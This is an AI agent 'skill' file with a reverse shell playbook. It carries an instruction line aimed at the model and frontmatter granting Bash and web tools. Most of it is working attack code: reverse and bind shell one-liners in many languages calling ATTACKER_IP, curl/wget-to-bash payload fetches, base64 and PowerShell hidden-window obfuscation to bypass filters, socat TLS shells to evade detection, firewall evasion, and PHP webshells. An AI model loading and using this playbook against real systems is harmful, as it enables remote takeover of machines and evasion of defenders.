---
name: reverse-shell-techniques
description: Reverse shell playbook — shell one-liners for bash/Python/PHP/Ruby/Perl/Java/PowerShell/nc, shell upgrade/stabilization (pty, stty), bind shells, encrypted shells (socat TLS), firewall evasion, and common shell stabilization.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Reverse Shell Techniques — Expert Playbook

> **AI LOAD INSTRUCTION**: Covers every major reverse shell one-liner variant, shell upgrade/stabilization procedures, bind shells, encrypted channels, and common firewall bypass techniques. Base models often give outdated one-liners that fail on specific systems or miss the shell upgrade step entirely.

## 0. RELATED ROUTING

- cmdi-command-injection — for getting the initial command execution
- arbitrary-write-to-rce — for escalating a write primitive to execute a reverse shell
- upload-insecure-files — webshell to reverse shell escalation

---

## 1. LISTENER SETUP (ATTACKER SIDE)

```bash
# Standard netcat listener
nc -lvnp 4444

# Rlwrap for arrow keys / history (recommended)
rlwrap nc -lvnp 4444

# Socat (better TTY support)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

---

## 2. BASH REVERSE SHELLS

```bash
# Standard bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Without -i (sometimes needed)
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Exec variant (avoids process name issues)
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# URL-encoded (for web injection)
bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'

# Base64 encoded (bypass filters)
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=" | base64 -d | bash

# /dev/tcp not available? Use curl/wget:
curl http://ATTACKER_IP:4444 | bash
wget -qO- http://ATTACKER_IP:4444/shell.sh | bash
```

---

## 3. PYTHON REVERSE SHELLS

```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PTY shell (fully interactive)
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in [0,1,2]];pty.spawn("/bin/bash")'
```

---

## 4. PHP REVERSE SHELLS

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

# One-liner
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Proc_open variant
php -r '$s=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'
```

---

## 5. POWERSHELL REVERSE SHELLS (WINDOWS)

```powershell
# Standard PowerShell reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded command (avoid quotes in web exploits)
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

---

## 6. OTHER LANGUAGES

```ruby
# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Netcat
nc -e /bin/sh ATTACKER_IP 4444
# If -e not available:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Java (for JSP/servlet injection)
Runtime r = Runtime.getRuntime();
String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"};
Process p = r.exec(commands);

# NodeJS
(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "ATTACKER_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## 7. SHELL UPGRADE / STABILIZATION

After getting a dumb shell (no autocomplete, no arrow keys, ctrl+C kills shell):

### Method 1: Python PTY (Most Common)

```bash
# Step 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Or: python -c 'import pty;pty.spawn("/bin/bash")'
# Or: script -qc /bin/bash /dev/null

# Step 2: Background and configure local terminal
# Ctrl+Z to background
stty raw -echo; fg

# Step 3: Set terminal size (get your local dimensions first)
# In LOCAL terminal: stty size → rows cols
# In SHELL: 
stty rows 50 columns 220
export TERM=xterm-256color
```

### Method 2: Socat (Best Quality)

```bash
# Attacker: start socat listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim: connect back with socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
# If socat not installed: download static binary
wget http://ATTACKER_IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat ...
```

### Method 3: Script Command

```bash
script -qc /bin/bash /dev/null
```

---

## 8. BIND SHELLS (Target connects, attacker connects in)

When outbound connections from target are firewalled:

```bash
# Netcat bind shell (listen on target)
nc -lvnp 4444 -e /bin/bash
# If -e not available:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f

# Python bind shell
python3 -c 'import socket,subprocess;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();[subprocess.call("/bin/bash",shell=True,stdin=c,stdout=c,stderr=c)]'

# Attacker connects to victim
nc VICTIM_IP 4444
```

---

## 9. ENCRYPTED SHELLS (SOCAT TLS)

Bypass network detection / SSL inspection:

```bash
# Generate certificate (attacker)
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 1 -out shell.crt
cat shell.crt shell.key > shell.pem

# Listener (attacker)
socat openssl-listen:4444,cert=shell.pem,verify=0 file:`tty`,raw,echo=0

# Connect (victim)
socat openssl-connect:ATTACKER_IP:4444,verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## 10. FIREWALL EVASION

```bash
# Use common ports (80, 443, 8080, 53)
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1

# DNS-over-TCP (port 53) — often allowed outbound
bash -i >& /dev/tcp/ATTACKER_IP/53 0>&1

# ICMP tunnel (if only ICMP allowed):
# Install: ptunnel or icmptunnel
# Tunnel TCP over ICMP packets

# HTTP tunnel via proxy
# Use proxychains if HTTP proxy available
```

---

## 11. WEBSHELL TO REVERSE SHELL

```php
<?php system($_GET['cmd']); ?>
# Access: http://target/shell.php?cmd=nc+-e+/bin/sh+ATTACKER_IP+4444

# Or POST-based:
<?php echo system($_POST['cmd']); ?>
```

---

## 12. QUICK REFERENCE — SHELL SELECTION

| Situation | Best Choice |
|---|---|
| Linux target, bash available | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| No /dev/tcp (Debian/Ubuntu) | Python or Perl |
| PHP web server | PHP exec() with bash one-liner |
| Windows target | PowerShell encoded command |
| Restricted environment | Socat static binary |
| High OpSec needed | Socat TLS encrypted |
| Fully interactive needed | Python PTY + stty stabilization |
